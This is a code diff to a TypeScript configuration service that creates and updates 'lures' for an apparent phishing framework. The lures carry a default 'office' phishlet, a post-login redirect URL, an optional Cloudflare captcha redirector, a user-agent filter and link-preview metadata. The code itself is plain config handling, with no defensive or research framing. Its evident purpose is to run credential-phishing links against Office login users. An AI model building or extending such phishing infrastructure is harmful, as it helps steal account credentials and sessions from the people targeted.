@@ -500,19 +500,26 @@ export class ConfigService {
     }
   }
 
+  /**
+   * Updates the link settings in the config file
+   * @param afterLoginRedirect The URL to redirect to after login
+   * @param useCaptcha Whether to use Cloudflare captcha
+   * @param linkPath The path for the link (will be prefixed with /)
+   * @returns Whether the operation was successful
+   */
   public async updateLinkSettings(
     afterLoginRedirect: string,
     useCaptcha: boolean,
     linkPath: string
   ): Promise<boolean> {
     try {
+      // Read the current config
       const config = await this.readConfig();
       if (!config) {
-        console.error("Config not found");
         return false;
       }
 
-      // Ensure linkPath always starts with a single forward slash
+      // Format the path to ensure it starts with a slash
       const formattedPath = linkPath.startsWith("/")
         ? linkPath
         : `/${linkPath}`;
@@ -527,30 +534,79 @@ export class ConfigService {
         if (!config.lures) {
           config.lures = [];
         }
+
         config.lures.push({
+          id: this.generateId(),
+          phishlet: "office", // Default to office
+          path: formattedPath,
+          redirector: useCaptcha ? "main" : "",
+          redirect_url: afterLoginRedirect,
           hostname: "",
-          id: "",
+          paused: 0,
           info: "",
+          og_title: "",
           og_desc: "",
           og_image: "",
-          og_title: "",
           og_url: "",
-          path: formattedPath,
-          paused: 0,
-          phishlet: "office",
-          redirect_url: afterLoginRedirect,
-          redirector: "main",
           ua_filter: "",
         });
       } else {
         // Update first lure
         config.lures[0].path = formattedPath;
         config.lures[0].redirect_url = afterLoginRedirect;
+        config.lures[0].redirector = useCaptcha ? "main" : "";
       }
 
+      // Save the updated config
       return await this.writeConfig(config);
     } catch (error) {
       console.error("Error updating link settings:", error);
+      return false;
+    }
+  }
+
+  /**
+   * Updates a specific lure's settings in the config file
+   * @param lureId The ID of the lure to update
+   * @param afterLoginRedirect The URL to redirect to after login
+   * @param useCaptcha Whether to use Cloudflare captcha
+   * @param linkPath The path for the link (will be prefixed with /)
+   * @returns Whether the operation was successful
+   */
+  public async updateSpecificLureLinkSettings(
+    lureId: string,
+    afterLoginRedirect: string,
+    useCaptcha: boolean,
+    linkPath: string
+  ): Promise<boolean> {
+    try {
+      // Read the current config
+      const config = await this.readConfig();
+      if (!config || !config.lures || !Array.isArray(config.lures)) {
+        return false;
+      }
+
+      // Format the path to ensure it starts with a slash
+      const formattedPath = linkPath.startsWith("/")
+        ? linkPath
+        : `/${linkPath}`;
+
+      // Find the specific lure by ID
+      const lureIndex = config.lures.findIndex((lure) => lure.id === lureId);
+      if (lureIndex === -1) {
+        console.error(`Lure with ID ${lureId} not found`);
+        return false;
+      }
+
+      // Update the specific lure
+      config.lures[lureIndex].path = formattedPath;
+      config.lures[lureIndex].redirect_url = afterLoginRedirect;
+      config.lures[lureIndex].redirector = useCaptcha ? "main" : "";
+
+      // Save the updated config
+      return await this.writeConfig(config);
+    } catch (error) {
+      console.error(`Error updating lure ${lureId} settings:`, error);
       return false;
     }
   }
@@ -565,7 +621,6 @@ export class ConfigService {
       if (!config || !config.lures || !Array.isArray(config.lures)) {
         return [];
       }
-
       return config.lures;
     } catch (error) {
       console.error("Error getting lures:", error);
@@ -654,6 +709,14 @@ export class ConfigService {
       console.error("Error updating config:", error);
       return false;
     }
+  }
+
+  // Add a helper method to generate unique IDs for lures
+  private generateId(): string {
+    return (
+      Math.random().toString(36).substring(2, 15) +
+      Math.random().toString(36).substring(2, 15)
+    );
   }
 }
 
